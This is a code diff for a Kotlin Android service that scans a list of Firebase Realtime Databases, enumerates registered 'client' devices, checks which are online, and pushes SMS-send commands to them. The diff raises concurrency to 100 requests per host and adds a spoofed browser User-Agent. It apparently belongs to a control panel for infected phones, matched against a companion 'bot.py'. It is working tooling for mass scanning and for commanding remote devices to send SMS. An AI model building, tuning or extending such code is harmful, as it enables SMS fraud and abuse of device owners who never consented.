@@ -13,6 +13,8 @@ import kotlinx.coroutines.sync.Semaphore
 import kotlinx.coroutines.sync.withPermit
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
+import okhttp3.Dispatcher
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -45,14 +47,22 @@ data class SendResult(
 
 class RealtimeDbService {
 
-    // timeouts match bot.py: connect 5s, read 8s, total call 15s
-    private val http: OkHttpClient = OkHttpClient.Builder()
-        .connectTimeout(5, TimeUnit.SECONDS)
-        .readTimeout(8, TimeUnit.SECONDS)
-        .writeTimeout(5, TimeUnit.SECONDS)
-        .callTimeout(15, TimeUnit.SECONDS)
-        .retryOnConnectionFailure(true)
-        .build()
+    // OkHttp dispatcher: default is 5 req/host — kills parallel scans.
+    // bot.py uses limit_per_host=100. match it here.
+    private val http: OkHttpClient = run {
+        val dispatcher = Dispatcher().apply {
+            maxRequests = 100
+            maxRequestsPerHost = 100
+        }
+        OkHttpClient.Builder()
+            .connectTimeout(5, TimeUnit.SECONDS)
+            .readTimeout(8, TimeUnit.SECONDS)
+            .writeTimeout(5, TimeUnit.SECONDS)
+            .callTimeout(10, TimeUnit.SECONDS)
+            .retryOnConnectionFailure(false)
+            .dispatcher(dispatcher)
+            .build()
+    }
 
     private val jsonMedia = "application/json; charset=utf-8".toMediaType()
 
@@ -102,26 +112,37 @@ class RealtimeDbService {
     ): List<Device> = withContext(Dispatchers.IO) {
         if (firebases.isEmpty()) return@withContext emptyList<Device>()
 
-        // semaphore per device (bot uses 400, Android safe at 60)
+        Log.d(TAG, "scanAll: ${firebases.size} firebase(s)")
+
+        // global cap on parallel device fetches
         val deviceSem = Semaphore(60)
 
-        coroutineScope {
-            val all = firebases.mapIndexed { idx, fb ->
-                async {
-                    try {
-                        scanFirebase(fb, deviceSem) { count ->
-                            onProgress?.invoke(idx, count)
+        // hard cap so scan can't hang forever
+        val result = withTimeoutOrNull(45_000L) {
+            coroutineScope {
+                firebases.mapIndexed { idx, fb ->
+                    async {
+                        try {
+                            scanFirebase(fb, deviceSem) { count ->
+                                onProgress?.invoke(idx, count)
+                            }
+                        } catch (e: CancellationException) {
+                            throw e
+                        } catch (e: Exception) {
+                            Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
+                            emptyList<Device>()
                         }
-                    } catch (e: CancellationException) {
-                        throw e
-                    } catch (e: Exception) {
-                        Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
-                        emptyList<Device>()
                     }
-                }
-            }.awaitAll().flatten()
+                }.awaitAll().flatten()
+            }
+        }
 
-            all
+        if (result == null) {
+            Log.w(TAG, "scanAll timed out after 45s")
+            emptyList()
+        } else {
+            Log.d(TAG, "scanAll done: ${result.size} online device(s)")
+            result
         }
     }
 
@@ -136,11 +157,14 @@ class RealtimeDbService {
         val baseUrl = fb.url.trimEnd('/')
         val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS
 
+        Log.d(TAG, "scan ${fb.label}: GET $clientsUrl")
+
         // 1. shallow list of device IDs
         val bodyText: String? = try {
             val req = Request.Builder()
                 .url(clientsUrl)
                 .header("Accept", "application/json")
+                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                 .get()
                 .build()
             http.newCall(req).execute().use { resp ->
@@ -159,6 +183,7 @@ class RealtimeDbService {
         }
 
         if (bodyText == null || bodyText.isEmpty() || bodyText == "null") {
+            Log.d(TAG, "scan ${fb.label}: empty/null response")
             return@coroutineScope emptyList<Device>()
         }
 
@@ -172,9 +197,14 @@ class RealtimeDbService {
         val deviceIds = mutableListOf<String>()
         val keys = idsObj.keys()
         while (keys.hasNext()) deviceIds.add(keys.next())
-        if (deviceIds.isEmpty()) return@coroutineScope emptyList<Device>()
+        if (deviceIds.isEmpty()) {
+            Log.d(TAG, "scan ${fb.label}: 0 device IDs")
+            return@coroutineScope emptyList<Device>()
+        }
 
-        // 2. fetch each device in parallel — semaphore capped
+        Log.d(TAG, "scan ${fb.label}: ${deviceIds.size} device IDs to fetch")
+
+        // 2. fetch each device in parallel
         val found = java.util.Collections.synchronizedList(mutableListOf<Device>())
 
         deviceIds.map { devId ->
@@ -193,6 +223,7 @@ class RealtimeDbService {
             }
         }.awaitAll()
 
+        Log.d(TAG, "scan ${fb.label}: ${found.size} online / ${deviceIds.size} total")
         found.toList()
     }
 
@@ -205,6 +236,7 @@ class RealtimeDbService {
             val req = Request.Builder()
                 .url(url)
                 .header("Accept", "application/json")
+                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                 .get()
                 .build()
 
@@ -238,10 +270,8 @@ class RealtimeDbService {
 
     // ============================================================
     //  IS ONLINE — bot-parity
-    //  Bot: bool flags, status bool, status string, lastSeen <60s
     // ============================================================
     private fun isOnline(obj: JSONObject): Boolean {
-        // 1. boolean-ish flags
         for (key in listOf("isOnline", "online", "connected", "active")) {
             val v = obj.opt(key) ?: continue
             if (v is Boolean && v) return true
@@ -252,7 +282,6 @@ class RealtimeDbService {
             }
         }
 
-        // 2. status — could be bool or string
         val st = obj.opt("status")
         if (st is Boolean && st) return true
         if (st is String) {
@@ -260,7 +289,6 @@ class RealtimeDbService {
             if (s == "online" || s == "active" || s == "connected" || s == "1") return true
         }
 
-        // 3. last seen within 60s
         val lastSeen = obj.opt("lastSeen") ?: obj.opt("last_seen") ?: obj.opt("lastOnline")
         try {
             if (lastSeen != null) {
@@ -278,7 +306,7 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  EXTRACTORS — bot-parity
+    //  EXTRACTORS
     // ============================================================
     private fun extractDeviceName(obj: JSONObject): String {
         for (k in listOf("deviceName", "name", "model", "device", "brand")) {
@@ -359,7 +387,7 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  SEND SMS — bot-parity · 3-attempt fallback
+    //  SEND SMS
     // ============================================================
     suspend fun sendSms(
         firebaseUrl: String,
@@ -392,6 +420,8 @@ class RealtimeDbService {
                 val url = firebaseUrl.trimEnd('/') + path
                 val req = Request.Builder()
                     .url(url)
+                    .header("Accept", "application/json")
+                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                     .put(body.toRequestBody(jsonMedia))
                     .build()
 
@@ -406,9 +436,7 @@ class RealtimeDbService {
                 }
             } catch (e: CancellationException) {
                 throw e
-            } catch (_: Exception) {
-                // try next
-            }
+            } catch (_: Exception) {}
         }
 
         SendResult(
@@ -419,9 +447,6 @@ class RealtimeDbService {
         )
     }
 
-    // ============================================================
-    //  PATH CACHE
-    // ============================================================
     fun getCachedPath(fbId: String, devId: String): String? =
         pathCache["$fbId:$devId"]
 
